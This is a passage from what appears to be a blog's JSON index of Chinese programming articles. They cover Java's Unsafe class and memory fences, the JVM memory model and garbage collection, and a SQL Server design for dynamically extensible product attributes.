baseAddress=“0x110000”，通过baseAddress+valueOffset得到value的内存地址valueAddress=“0x11000c”；然后通过CAS进行原子性的更新操作，成功则返回，否则继续重试，直到更新成功为止。 3、线程调度 包括线程挂起、恢复、锁机制等方法。 12345678910111213复制&#x2F;&#x2F;取消阻塞线程 public native void unpark(Object thread); &#x2F;&#x2F;阻塞线程 public native void park(boolean isAbsolute, long time); &#x2F;&#x2F;获得对象锁（可重入锁） @Deprecated public native void monitorEnter(Object o); &#x2F;&#x2F;释放对象锁 @Deprecated public native void monitorExit(Object o); &#x2F;&#x2F;尝试获取对象锁 @Deprecated public native boolean tryMonitorEnter(Object o); 方法park、unpark即可实现线程的挂起与恢复，将一个线程进行挂起是通过park方法实现的，调用park方法后，线程将一直阻塞直到超时或者中断等条件出现；unpark可以终止一个挂起的线程，使其恢复正常。 典型应用 Java锁和同步器框架的核心类AbstractQueuedSynchronizer，就是通过调用LockSupport.park()和LockSupport.unpark()实现线程的阻塞和唤醒的，而LockSupport的park、unpark方法实际是调用Unsafe的park、unpark方式来实现。 4、内存屏障 在Java 8中引入，用于定义内存屏障（也称内存栅栏，内存栅障，屏障指令等，是一类同步屏障指令，是CPU或编译器在对内存随机访问的操作中的一个同步点，使得此点之前的所有读写操作都执行后才可以开始执行此点之后的操作），避免代码重排序。 123456复制&#x2F;&#x2F;内存屏障，禁止load操作重排序。屏障前的load操作不能被重排序到屏 障后，屏障后的load操作不能被重排序到屏障前 public native void loadFence(); &#x2F;&#x2F;内存屏障，禁止store操作重排序。屏障前的store操作不能被重排序到屏障后， 屏障后的store操作不能被重排序到屏障前 public native void storeFence(); &#x2F;&#x2F;内存屏障，禁止load、store操作重排序 public native void fullFence(); 典型应用 在Java 8中引入了一种锁的新机制——StampedLock，它可以看成是读写锁的一个改进版本。StampedLock提供了一种乐观读锁的实现，这种乐观读锁类似于无锁的操作，完全不会阻塞写线程获取写锁，从而缓解读多写少时写线程“饥饿”现象。由于StampedLock提供的乐观读锁不阻塞写线程获取读锁，当线程共享变量从主内存load到线程工作内存时，会存在数据不一致问题，所以当使用StampedLock的乐观读锁时，需要遵从如下图用例中使用的模式来确保数据的一致性。 如上图用例所示计算坐标点Point对象，包含点移动方法move及计算此点到原点的距离的方法distanceFromOrigin。在方法distanceFromOrigin中，首先，通过tryOptimisticRead方法获取乐观读标记；然后从主内存中加载点的坐标值(x,y)；而后通过StampedLock的validate方法校验锁状态，判断坐标点(x,y)从主内存加载到线程工作内存过程中，主内存的值是否已被其他线程通过move方法修改，如果validate返回值为true，证明(x,y)的值未被修改，可参与后续计算；否则，需加悲观读锁，再次从主内存加载(x,y)的最新值，然后再进行距离计算。其中，校验锁状态这步操作至关重要，需要判断锁状态是否发生改变，从而判断之前copy到线程工作内存中的值是否与主内存的值存在不一致。 下图为StampedLock.validate方法的源码实现，通过锁标记与相关常量进行位运算、比较来校验锁状态，在校验逻辑之前，会通过Unsafe的loadFence方法加入一个load内存屏障，目的是避免上图用例中步骤②和StampedLock.validate中锁状态校验运算发生重排序导致锁状态校验不准确的问题。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[]},{"title":"java虚拟机内存模型","slug":"Virtual machine memory model","date":"2019-12-03T16:00:00.000Z","updated":"2020-10-25T08:28:25.000Z","comments":true,"path":"Virtual machine memory model/","link":"","permalink":"https://gschaos.club/Virtual%20machine%20memory%20model/","excerpt":"java虚拟机内存模型","text":"java虚拟机内存模型 作者：土豆是我的最爱 原文链接：https://blog.csdn.net/qq_37141773/article/details/103138476 虚拟机 同样的java代码在不同平台生成的机器码肯定是不一样的，因为不同的操作系统底层的硬件指令集是不同的。 同一个java代码在windows上生成的机器码可能是0101…….，在linux上生成的可能是1100……，那么这是怎么实现的呢？ 不知道同学们还记不记得，在下载jdk的时候，我们在oracle官网，基于不同的操作系统或者位数版本要下载不同的jdk版本，也就是说针对不同的操作系统，jdk虚拟机有不同的实现。 那么虚拟机又是什么东西呢，如图是从软件层面屏蔽不同操作系统在底层硬件与指令上的区别，也就是跨平台的由来。 说到这里同学们可能还是有点不太明白，说的还是太宏观了，那我们来了解下java虚拟机的组成。 虚拟机组成 栈我们先讲一下其中的一块内存区域栈，大家都知道栈是存储局部变量的，也是线程独有的区域，也就是每一个线程都会有自己独立的栈区域。 12345678910111213141516public class Math &#123; public static int initData = 666; public static User user = new User();public int compute() &#123; int a = 1; int b = 2; int c = (a+b) * 10; return c;&#125; public static void main(String[] args) &#123; Math math = new Math(); math.compute(); System.out.println(&quot;test&quot;); &#125;&#125; 说起栈大家都不会陌生，数据结构中就有学，这里线程栈中存储数据的部分使用的就是栈，先进后出。 大家都知道每个方法都有自己的局部变量，比如上图中main方法中的math，compute方法中的a b c，那么java虚拟机为了区分不同方法中局部变量作用域范围的内存区域，每个方法在运行的时候都会分配一块独立的栈帧内存区域，我们试着按上图中的程序来简单画一下代码执行的内存活动。 执行main方法中的第一行代码是，栈中会分配main()方法的栈帧，并存储math局部变量,，接着执行compute()方法，那么栈又会分配compute()的栈帧区域。 这里的栈存储数据的方式和数据结构中学习的栈是一样的，先进后出。当compute()方法执行完之后，就会出栈被释放，也就符合先进后出的特点，后调用的方法先出栈。 栈帧那么栈帧内部其实不只是存放局部变量的，它还有一些别的东西，主要由四个部分组成。 那么要讲这个就会涉及到更底层的原理–字节码。我们先看下我们上面代码的字节码文件。 看着就是一个16字节的文件，看着像乱码，其实每个都是有对应的含义的，oracle官方是有专门的jvm字节码指令手册来查询每组指令对应的含义的。那我们研究的，当然不是这个。 jdk有自带一个javap的命令，可以将上述class文件生成一种更可读的字节码文件。 我们使用javap -c命令将class文件反编译并输出到TXT文件中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Compiled from &quot;Math.java&quot;public class com.example.demo.test1.Math &#123; public static int initData; public static com.example.demo.bean.User user; public com.example.demo.test1.Math(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public int compute(); Code: 0: iconst_1 1: istore_1 2: iconst_2 3: istore_2 4: iload_1 5: iload_2 6: iadd 7: bipush 10 9: imul 10: istore_3 11: iload_3 12: ireturn public static void main(java.lang.String[]); Code: 0: new #2 // class com/example/demo/test1/Math 3: dup 4: invokespecial #3 // Method &quot;&lt;init&gt;&quot;:()V 7: astore_1 8: aload_1 9: invokevirtual #4 // Method compute:()I 12: pop 13: getstatic #5 // Field java/lang/System.out:Ljava/io/PrintStream; 16: ldc #6 // String test 18: invokevirtual #7 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 21: return static &#123;&#125;; Code: 0: sipush 666 3: putstatic #8 // Field initData:I 6: new #9 // class com/example/demo/bean/User 9: dup 10: invokespecial #10 // Method com/example/demo/bean/User.&quot;&lt;init&gt;&quot;:()V 13: putstatic #11 // Field user:Lcom/example/demo/bean/User; 16: return&#125; 此时的jvm指令码就清晰很多了，大体结构是可以看懂的，类、静态变量、构造方法、compute()方法、main()方法。 其中方法中的指令还是有点懵，我们举compute()方法来看一下： 12345678910111213Code: 0: iconst_1 1: istore_1 2: iconst_2 3: istore_2 4: iload_1 5: iload_2 6: iadd 7: bipush 10 9: imul 10: istore_3 11: iload_3 12: ireturn 这几行代码就是对应的我们代码中compute()方法中的四行代码。大家都知道越底层的代码，代码实现的行数越多，因为他会包含一些java代码在运行时底层隐藏的一些细节原理。 那么一样的，这个jvm指令官方也是有手册可以查阅的，网上也有很多翻译版本，大家如果想了解可自行百度。 这里我只讲解本博文设计代码中的部分指令含义： 将int类型常量1压入操作数栈 10: iconst_1 这一步很简单，就是将1压入操作数栈 将int类型值存入局部变量1 121: istore_1 局部变量1，在我们代码中也就是第一个局部变量a，先给a在局部变量表中分配内存，然后将int类型的值，也就是目前唯一的一个1存入局部变量a 将int类型常量2压入操作数栈 12: iconst_2 将int类型值存入局部变量2 13: istore_2 这两行代码就和前两行类似了。 从局部变量1中装载int类型值 14: iload_1 从局部变量2中装载int类型值 15: iload_2 这两个代码是将局部变量1和2，也就是a和b的值装载到操作数栈中 执行int类型的加法 16: iadd iadd指令一执行，会将操作数栈中的1和2依次从栈底弹出并相加，然后把运算结果3在压入操作数栈底。 将一个8位带符号整数压入栈 17: bipush 10 这个指令就是将10压入栈 执行int类型的乘法 19: imul 这里就类似上面的加法了，将3和10弹出栈，把结果30压入栈 将将int类型值存入局部变量3 110: istore_3 这里大家就不陌生了吧，和第二步第三步是一样的，将30存入局部变量3，也就是c 从局部变量3中装载int类型值 111: iload_3 这个前面也说了 返回int类型值 112: ireturn 这个就不用多说了，就是将操作数栈中的30返回 到这里就把我们compute()方法讲解完了，讲完有没有对局部变量表和操作数栈的理解有所加深呢？说白了赋值号=后面的就是操作数，在这些操作数进行赋值，运算的时候需要内存存放，那就是存放在操作数栈中，作为临时存放操作数的一小块内存区域。 接下来我们再说说方法出口。 方法出口说白了不就是方法执行完了之后要出到哪里，那么我们知道上面compute()方法执行完之后应该回到main()方法第三行那么当main()方法调用compute()的时候，compute()栈帧中的方法出口就存储了当前要回到的位置，那么当compute()方法执行完之后，会根据方法出口中存储的相关信息回到main()方法的相应位置。 那么main()方同样有自己的栈帧，在这里有些不同的地方我们讲一下。 我们上面已经知道局部变量会存放在栈帧中的局部变量表中，那么main()方法中的math会存入其中，但是这里的math是一个对象，我们知道new出来的对象是存放在堆中的 那么这个math变量和堆中的对象有什么联系呢？是同一个概念么？ 当然不是的，局部变量表中的math存储的是堆中那个math对象在堆中的内存地址 程序计数器程序计数器也是线程私有的区域，每个线程都会分配程序计数器的内存，是用来存放当前线程正在运行或者即将要运行的jvm指令码对应的地址，或者说行号位置。 上述代码中每个指令码前面都有一个行号，你就可以把它看作当前线程执行到某一行代码位置的一个标识，这个值就是程序计数器的值。 那么jvm虚拟机为什么要设置程序计数器这个结构呢？就是为了多线程的出现，多线程之间的切换，当一个程序被挂起的时候，总是要恢复的，那么恢复到哪个位置呢，总不能又重新开始执行吧，那么程序计数器就解决了这个问题。 方法区在jdk1.8之前，有一个名称叫做持久带/永久代，很多同学应该听过，在jdk1.8之后，oracle官方改名为元空间。存放常量、静态变量、类元信息。 1public static int initData = 666; 这个initData就是静态变量，毋庸置疑是存放在方法区的 1public static User user = new User(); 那么这个user就有点不一样了，user变量放在方法区，new的User是存放在堆中的 到这里我们就能意识到栈，堆，方法区之间都是有联系的。 栈中的局部变量，方法区中的静态变量，如果是对象类型的话都会指向堆中new出来中的对象，那么红色的联系代表什么呢？我们先来了解一下对象。 对象组成你对对象的了解有多少呢，天天用对象，你是否知道对象在虚拟机中的存储结构呢？ 对象在内存中存储的布局可以分为3块区域：对象头（Header）、实例数据（Instance Data）和对齐填充（Padding）。下图是普通对象实例与数组对象实例的数据结构： 对象头 HotSpot虚拟机的对象头包括两部分信息： Mark Word 第一部分markword,用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等，这部分数据的长度在32位和64位的虚拟机（未开启压缩指针）中分别为32bit和64bit，官方称它为“MarkWord”。 Klass Pointer 对象头的另外一部分是klass类型指针，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例. 数组长度（只有数组对象有） 如果对象是一个数组, 那在对象头中还必须有一块数据用于记录数组长度. 实例数据 实例数据部分是对象真正存储的有效信息，也是在程序代码中所定义的各种类型的字段内容。无论是从父类继承下来的，还是在子类中定义的，都需要记录起来。 对齐填充 第三部分对齐填充并不是必然存在的，也没有特别的含义，它仅仅起着占位符的作用。由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，换句话说，就是对象的大小必须是8字节的整数倍。而对象头部分正好是8字节的倍数（1倍或者2倍），因此，当对象&gt; 实例数据部分没有对齐时，就需要通过对齐填充来补全。 其中的klass类型指针就是那条红色的联系，那是怎么联系的呢？ 1new Thread().start(); 类加载其实最终是以类元信息的形式存储在方法区中的，math和math2都是由同一个类new出来的，当对象被new时，都会在对象头中存储一个指向类元信息的指针，这就是Klass Pointer. 到这里我们就讲解了栈，程序计数器和方法区，下面我们简单介绍一下本地方法区，最后再终点讲解堆。 本地方法栈实际上现在本地方法栈已经用的比较少了，大家应该都有听过本地方法吧 如何经常用的线程类 123456789101112131415161718new Thread().start();public synchronized void start() &#123; if (threadStatus != 0) throw new IllegalThreadStateException(); group.add(this); boolean started = false; try &#123; start0(); started = true; &#125; finally &#123; try &#123; if (!started) &#123; group.threadStartFailed(this); &#125; &#125; catch (Throwable ignore) &#123; &#125; &#125; &#125; 其中底层调用了一个start0()的方法 1private native void start0(); 这个方法没有实现，但又不是接口，是使用native修饰的，是属于本地方法，底层通过C语言实现的，那java代码里为什么会有C语言实现的本地方法呢？ 大家都知道JAVA是问世的，在那之前一个公司的系统百分之九十九都是使用C语言实现的，但是java出现后，很多项目都要转为java开发，那么新系统和旧系统就免不了要有交互，那么就需要本地方法来实现了，底层是调用C语言中的dll库文件，就类似于java中的jar包，当然，如今跨语言的交互方式就很多了，比如thrift，http接口方式，webservice等，当时并没有这些方式，就只能通过本地方法来实现了。 那么本地方法始终也是方法，每个线程在运行的时候，如果有运行到本地方法，那么必然也要产生局部变量等，那么就需要存储在本地方法栈了。如果没有本地方法，也就没有本地方法栈了。 堆最后我们讲堆，堆是最重要的一块内存区域，我相信大部分人对堆都不陌生。但是对于它的内部结构，运作细节想要搞清楚也没那么简单。 对于这个基本组成大家应该都有所了解，对就是由年轻代和老年代组成，年轻代又分为伊甸园区和survivor区，survivor区中又有from区和to区. 我们new出来的对象大家都知道是放在堆中，那具体放在堆中的哪个位置呢？ 其实new出来的对象一般都放在Eden区，那么为什么叫伊甸园区呢，伊甸园就是亚当夏娃住的地方，不就是造人的地方么？所以我们new出来的对象就是放在这里的，那当Eden区满了之后呢？ 假设我们给对分配600M内存，这个是可以通过参数调节的，我们后文再讲。那么老年代默认是占2/3的，也就是差不多400M，那年轻代就是200M，Eden区160M，Survivor区40M。 GC 一个程序只要在运行，那么就不会不停的new对象，那么总有一刻Eden区会放满，那么一旦Eden区被放满之后，虚拟机会干什么呢？没错，就是gc，不过这里的gc属于minor gc，就是垃圾收集，来收集垃圾对象并清理的，那么什么是垃圾对象呢？ 好比我们上面说的math对象，我们假设我们是一个web应用程序，main线程执行完之后程序不会结束，但是main方法结束了，那么main()方法栈帧会被释放，局部变量会被释放，但是局部变量对应的堆中的对象还是依然存在的，但是又没有指针指向它，那么它就是一个垃圾对象，那就应该被回收掉了，之后如果还会new Math对象，也不会用这个之前的了，因为已经无法找到它了，如果留着这个对象只会占用内存，显然是不合适的。 这里就涉及到了一个GC Root根以及可达性分析算法的概念，也是面试偶尔会被问到的。 可达性分析算法是将GC Roots对象作为起点，从这些起点开始向下搜索引用的对象，找到的对象都标记为非垃圾对象，其余未标记的都是垃圾对象。 那么GC Roots根对象又是什么呢，GC Roots根就是判断一个对象是否可以回收的依据，只要能通过GC Roots根向下一直搜索能搜索到的对象，那么这个对象就不算垃圾对象，而可以作为GC Roots根的有线程栈的本地变量，静态变量，本地方法栈的变量等等，说白了就是找到和根节点有联系的对象就是有用的对象，其余都认为是垃圾对象来回收。 经历了第一次minor gc后，没有被清理的对象就会被移到From区，如上图。 上面在说对象组成的时候有写到，在对象头的Mark Word中有存储GC分代年龄，一个对象每经历一次gc，那么它的gc分代年龄就会+1，如上图。 那么如果第二次新的对象又把Eden区放满了，那么又会执行minor gc，但是这次会连着From区一起gc，然后将Eden区和From区存活的对象都移到To区域，对象头中分代年龄都+1，如上图。 那么当第三次Eden区又满的时候，minor gc就是回收Eden区和To区域了，Eden区和To区域还活着的对象就会都移到From区，如上图。说白了就是Survivor区中总有一块区域是空着的，存活的对象存放是在From区和To区轮流存放，也就是互相复制拷贝，这也就是垃圾回收算法中的复制-回收算法。 如果一个对象经历了一个限值15次gc的时候，就会移至老年代。那如果还没有到限值，From区或者To区域也放不下了，就会直接挪到老年代，这只是举例了两种常规规则，还有其他规则也是会把对象存放至老年代的。 那么随着应用程序的不断运行，老年代最终也是会满的，那么此时也会gc，此时的gc就是Full gc了。 GC案例下面我们通过一个简单的演示案例来更加清楚的了解GC。 12345678910public class HeapTest &#123; byte[] a = new byte[1024*100]; public static void main(String[] args) throws InterruptedException &#123; ArrayList&lt;HeapTest&gt; heapTest = new ArrayList&lt;&gt;(); while(true) &#123; heapTest.add(new HeapTest()); Thread.sleep(10); &#125; &#125;&#125; 这块代码很明显，就是一个死循环，不断的往list中添加new出来的对象。 我们这里使用jdk自带的一个jvm调优工具jvisualvm来观察一下这个代码执行的的内存结构。 运行代码打开之后我们可以看到这样的界面： 我们在左边的应用程序中可以看到我们运行的这个代码，右边是它的一些jvm，内存信息，我们这里不关注，我们需要用到的是最后一个Visual GC面板，这是一个插件，如果你的打开没有这一栏的话，可以再工具栏的插件中进行下载安装。 打开visual GC，我们先看一下界面大概的布局， 其中老年代(Olc)，伊甸园区(Eden)，S0(From)，S1(To)几个区域的内存和动态分配图都是清晰可见，以一对应的。 我们选择中间一张图给大家对应一下上面所讲的内容： 1：对象放入Eden区 2：Eden区满发生minor gc 3：第二步的存活对象移至From(Survivor 0)区 4：Eden区再满发生minor gc 5：第四步存活的对象移至To(Survivor 1)区 这里可以注意到From和To区域和我们上面所说移至，总有一个是空的。 大家还可以注意到老年代这里，都是一段一段的直线，中间是突然的增加，这就是在minor gc中一批一批符合规则的对象被批量移入老年代。 那当我们老年代满了会发生什么呢？当然是我们上面说过的Full GC，但是你仔细看我们写的这个程序，我们所有new出来的HeapTest对象都是存放在heapLists中的，那就会被这个局部变量所引用，那么Full GC就不会有什么垃圾对象可以回收，可是内存又满了，那怎么办？ 没错，就是我们就算没见过也总听过的OOM。 到这里jvm内存模型简单介绍就结束了，看到这里还不点个赞嘛！","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[]},{"title":"数据库字段动态扩展","slug":"数据库字段动态扩展设计","date":"2019-12-01T16:00:00.000Z","updated":"2020-10-25T08:29:36.000Z","comments":true,"path":"数据库字段动态扩展设计/","link":"","permalink":"https://gschaos.club/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E6%AE%B5%E5%8A%A8%E6%80%81%E6%89%A9%E5%B1%95%E8%AE%BE%E8%AE%A1/","excerpt":"数据库字段动态扩展设计","text":"数据库字段动态扩展设计 数据库字段动态扩展设计以商品为例，类似淘宝上的设计，要求如下： 字段自动扩展 属性公用 无限扩展字段 现在，看现实世界的产品： 一个产品怎么在数据库存储呢？如：产品表（产品名称，产品类别，品牌，型号，重量……） 而 产品类别 和 品牌 是冗余的，因此独立出两张表来。 再看看产品，电脑 和手机都有相同或者不同的属性，这只是简单列出，实际有几十或上百个字段，虽然操作方便，但这样设计非常不合理。 产品 类别id 品牌id 型号 内存 颜色 硬盘大小 电池容量 Iphone 1 55 6s 16GB 白色 2750mAh lenovo 2 333 aaaa 4GB 白色 500 GB 网上有几种方法： 动态添加属性字段。 先预留字段，到时再用。 使用 XML 字段保存。 JSON 格式保存。 属性字段行存储 还有一种方法，把相同属性的字段存储到同一个表，不同的属性，每个产品一张表，这可能会有非常多不同产品的特有属性表！ 产品表： 产品id 产品 类别id 品牌id 型号 内存 颜色 子表名 1 Iphone 1 55 6s 16GB 白色 表01 67 lenovo 2 333 aaaa 4GB 白色 表02 表01： 产品id 硬盘大小 1 500 GB 表02： 产品id 电池容量 67 2750mAh 所以现在总结考虑的是第五种方法：**属性字段行存储** 。**这样就能把所有产品的特有属性都存储到一张表中了！ 产品id 属性 值 1 硬盘大小 500 GB 67 电池容量 2750mAh 现在把所有属性都放到同一个表中，产品和属性分开存储： 产品表： 产品id 产品 类别id 品牌id 1 Iphone 1 55 67 lenovo 2 333 属性表： 产品id 属性 值 1 型号 6s 1 内存 16GB 1 颜色 白色 1 硬盘大小 500 GB 67 型号 aaaa 67 内存 4GB 67 颜色 白色 67 电池容量 2750mAh 结果如图： 看看 属性表 ，产品相同属性的就出现冗余了，得把属性和值分库两张表： 属性表： 属性id 属性 1 型号 2 内存 3 颜色 4 硬盘大小 5 电池容量 属性值表： 产品id 属性id 值 1 1 6s 1 2 16GB 1 3 白色 1 4 500 GB 67 1 aaaa 67 2 4GB 67 3 白色 67 5 2750mAh 结构关系如图： 似乎这还不算最终的结果，看 属性值表，对于不同的产品的颜色，也有一样的，属性值表 存储的又会有冗余了，如栗子中的 “白色”。到这里，其实不需要再分表了，有多少属性就插入到该表中。 若是更详细的，继续分表，把值也固定下来。对于颜色，红橙黄绿蓝靛紫等都详细把值都先定义了，在关系表关联对应的颜色就行。当然，属性值表将非常大，因为它包含了所有产品可能的所有参数。所以一般设计到上一步就行了。 属性值： 值id 值 1 灰色 2 黑色 3 蓝色 4 白色 ？ （其他） 属性值关系表： 产品id 属性id 值id 1 1 ？ 1 2 ？ 1 3 4 （白色） 67 1 ？ 67 3 4 （白色） 67 5 ？ 最终设计结果如下： 下面给个例子，只是列出关键字段（可自增列）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170use mastergocreate database Demogouse Demogo --类别（父类别）create table t2_Category(Categories_id int not null,Parent_id int null,name varchar(50) not null,constraint pk_Category primary key(Categories_id),)go insert into t2_Categoryselect 1,null,&#x27;电器电子&#x27; union allselect 2,null,&#x27;服装服饰&#x27; union allselect 3,null,&#x27;办公用品&#x27; union allselect 4,1,&#x27;电脑&#x27; union allselect 5,1,&#x27;手机&#x27; union allselect 6,2,&#x27;帽子&#x27; union allselect 7,2,&#x27;衣服&#x27; union allselect 8,4,&#x27;台式电脑&#x27; union allselect 9,4,&#x27;笔记本&#x27; union allselect 10,4,&#x27;Ipad&#x27;go --品牌create table t2_Brand(Brand_id int not null,name varchar(50) not null,constraint pk_Brand primary key(Brand_id),)go insert into t2_Brandselect 1,&#x27;苹果&#x27; union allselect 2,&#x27;华为&#x27; union allselect 3,&#x27;小米&#x27; union allselect 4,&#x27;诺基亚&#x27; union allselect 5,&#x27;路易·威登&#x27; union allselect 6,&#x27;SSPP&#x27; union allselect 7,&#x27;香奈儿&#x27;go --产品create table t2_Procduct(Procduct_id int not null,Categories_id int not null,Brand_id int not null,name varchar(50) not null,constraint pk_Procduct primary key(Procduct_id),constraint fk_Procduct_Category foreign key(Categories_id) references t2_Category(Categories_id),constraint fk_Procduct_Brand foreign key(Brand_id) references t2_Brand(Brand_id),)go insert into t2_Procductselect 1,4,1,&#x27;iMac aaa&#x27; union allselect 2,4,1,&#x27;Macbook Air bbb&#x27; union allselect 3,4,4,&#x27;Nokia ddd&#x27; union allselect 4,5,1,&#x27;Iphone 6&#x27; union allselect 5,5,1,&#x27;Iphone 6sp&#x27; union allselect 6,5,3,&#x27;小米4&#x27; union allselect 7,5,3,&#x27;红米9&#x27; union allselect 8,6,5,&#x27;贝雷帽 1999&#x27; union allselect 9,7,5,&#x27;上衣 COACH 1941&#x27; union allselect 10,7,7,&#x27;围脖 1945&#x27;go --属性create table t2_Property(Property_id int not null,name varchar(50) not null,constraint pk_Property primary key(Property_id))go insert into t2_Propertyselect 1,&#x27;颜色&#x27; union allselect 2,&#x27;屏幕尺寸&#x27; union allselect 3,&#x27;屏幕分辨率&#x27; union allselect 4,&#x27;CPU型号&#x27; union allselect 5,&#x27;硬盘容量&#x27; union allselect 6,&#x27;内存&#x27; union allselect 7,&#x27;重量&#x27; union allselect 8,&#x27;手机类型&#x27; union allselect 9,&#x27;材料&#x27; union allselect 10,&#x27;衣长&#x27;go --属性值create table t2_PropertyValue(PropertyValue_id int not null,Property_id int not null,Value varchar(50) not null,constraint pk_PropertyValue primary key(PropertyValue_id),constraint fk_PropertyValue_Property foreign key(Property_id) references t2_Property(Property_id))go insert into t2_PropertyValueselect 1,1,&#x27;白色&#x27; union allselect 2,1,&#x27;黑色&#x27; union allselect 3,1,&#x27;红色&#x27; union allselect 4,1,&#x27;蓝色&#x27; union allselect 5,1,&#x27;灰色&#x27; union allselect 6,2,&#x27;360X540&#x27; union allselect 7,2,&#x27;540X720&#x27; union allselect 8,2,&#x27;720X960&#x27; union allselect 9,2,&#x27;720X1280&#x27; union allselect 10,6,&#x27;1 GB&#x27; union allselect 11,6,&#x27;2 GB&#x27; union allselect 12,6,&#x27;4 GB&#x27; union allselect 13,6,&#x27;8 GB&#x27; union allselect 14,7,&#x27;100 g&#x27; union allselect 15,7,&#x27;200 g&#x27; union allselect 16,7,&#x27;300 g&#x27; union allselect 17,7,&#x27;400 g&#x27; union allselect 18,9,&#x27;棉&#x27; union allselect 19,9,&#x27;亚麻&#x27; union allselect 20,9,&#x27;人造纤维&#x27;go --产品属性值表(id,产品,属性,属性值)create table t2_ProductPropertyValue(ProductPropertyValue_id int not null,Procduct_id int not null,Property_id int not null,PropertyValue_id int not null,constraint pk_ProductPropertyValue primary key(ProductPropertyValue_id),constraint fk_ProductPropertyValue_Procduct foreign key(Procduct_id) references t2_Procduct(Procduct_id),constraint fk_ProductPropertyValue_Property foreign key(Property_id) references t2_Property(Property_id),constraint fk_ProductPropertyValue_PropertyValue foreign key(PropertyValue_id) references t2_PropertyValue(PropertyValue_id))go insert into t2_ProductPropertyValueselect 1,1,1,1 union allselect 2,3,1,2 union allselect 3,5,1,1 union allselect 4,6,1,4 union allselect 5,7,1,2 union allselect 6,8,1,5 union allselect 7,1,3,6 union allselect 8,1,3,7 union allselect 9,1,3,9 union allselect 10,1,6,11 union allselect 11,1,6,12 union allselect 12,1,7,13 union allselect 13,4,7,14 union allselect 14,5,7,16 union allselect 15,7,7,17 union allselect 16,9,9,18 union allselect 17,9,9,19 union allselect 18,9,9,20 union allselect 19,10,9,19 union allselect 20,10,9,20go select * from t2_Category --类别select * from t2_Brand --品牌select * from t2_Procduct --产品select * from t2_Property --属性select * from t2_PropertyValue --属性值select * from t2_ProductPropertyValue --产品属性值表 关系图： 123456789select t3.name as 类别,t4.name as 品牌,t2.name as 产品,t5.name as 属性,t6.Value as 属性值from t2_ProductPropertyValue t1 LEFT JOIN t2_Procduct t2 on t1.Procduct_id=t2.Procduct_idLEFT JOIN t2_Category t3 on t2.Categories_id=t3.Categories_idLEFT JOIN t2_Brand t4 on t2.Brand_id=t4.Brand_idLEFT JOIN t2_Property t5 on t1.Property_id=t5.Property_idLEFT JOIN t2_PropertyValue t6 on t1.PropertyValue_id=t6.PropertyValue_idorder by t3.name,t4.name,t2.name,t5.name,t6.Valuego 这是当前不同的产品，这里是详细的产品参数。无论怎么搜索产品，都能匹配出来。对于大型网站，所有的类型最好预先定义，让客户选择就行，否则商家随便定义各属性的值的话，记录将非常多（如颜色：赭石色，土黄色，深红色……）。 如果新增一款产品，如 “无人机” ，参数如下： 12345678/*===== 新增产品：无人机 =====类别：电器电子（已存在）品牌：大疆产品：无人机属性：颜色、重量、轴数 （&quot;颜色&quot;、&quot;重量&quot; 已存在）属性值：&#123;颜色:白色; 重量:1KG; 轴数:6; &#125; （&quot;白色&quot; 已存在）*/ 只需要添加没有的记录就行，当然添加前需要判断是否存在。 12345678910111213141516171819--新增insert into t2_Brand(Brand_id,name) values(8,&#x27;大疆&#x27;)insert into t2_Procduct(Procduct_id,Categories_id,Brand_id,name) values(11,1,8,&#x27;无人机&#x27;)insert into t2_Property(Property_id,name) values(11,&#x27;轴数&#x27;)insert into t2_PropertyValue(PropertyValue_id,Property_id,Value) values(21,7,&#x27;1 KG&#x27;),(22,11,&#x27;6&#x27;)insert into t2_ProductPropertyValue(ProductPropertyValue_id,Procduct_id,Property_id,PropertyValue_id)values(21,11,1,1),(22,11,7,21),(23,11,11,22)go select t3.name as 类别,t4.name as 品牌,t2.name as 产品,t5.name as 属性,t6.Value as 属性值from t2_ProductPropertyValue t1 LEFT JOIN t2_Procduct t2 on t1.Procduct_id=t2.Procduct_idLEFT JOIN t2_Category t3 on t2.Categories_id=t3.Categories_idLEFT JOIN t2_Brand t4 on t2.Brand_id=t4.Brand_idLEFT JOIN t2_Property t5 on t1.Property_id=t5.Property_idLEFT JOIN t2_PropertyValue t6 on t1.PropertyValue_id=t6.PropertyValue_idwhere t2.name = &#x27;无人机&#x27;order by t3.name,t4.name,t2.name,t5.name,t6.Valuego 基本设计完成。","categories":[{"name":"数据库字段动态扩展","slug":"数据库字段动态扩展","permalink":"https://gschaos.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E6%AE%B5%E5%8A%A8%E6%80%81%E6%89%A9%E5%B1%95/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"UNSAFE和Java 内存布局","slug":"unsafe-offset","date":"2019-11-14T16:00:00.000Z","updated":"2020-10-25T08:28:12.000Z","comments":true,"path":"unsafe-offset/","link":"","permalink":"https://gschaos.club/unsafe-offset/","excerpt":"在看CAS中经常会遇到unsafe.compareAndSwapInt(this, stateOffset, expect, update);很久很久以前看着就当眼熟;现在再看，结果对这个偏移量完全未知，于是有了这篇文章","text":"在看CAS中经常会遇到unsafe.compareAndSwapInt(this, stateOffset, expect, update);很久很久以前看着就当眼熟;现在再看，结果对这个偏移量完全未知，于是有了这篇文章 UNSAFE和Java 内存布局（深入理解：锁/反射/线程挂起/内存回收等）最近在翻ReentrantLock源码的时候，看到AQS（AbstractQueuedSynchronizer.java）里面有一段代码 1234protected final boolean compareAndSetState(int expect, int update) &#123; // See below for intrinsics setup to support this return unsafe.compareAndSwapInt(this, stateOffset, expect, update);&#125; 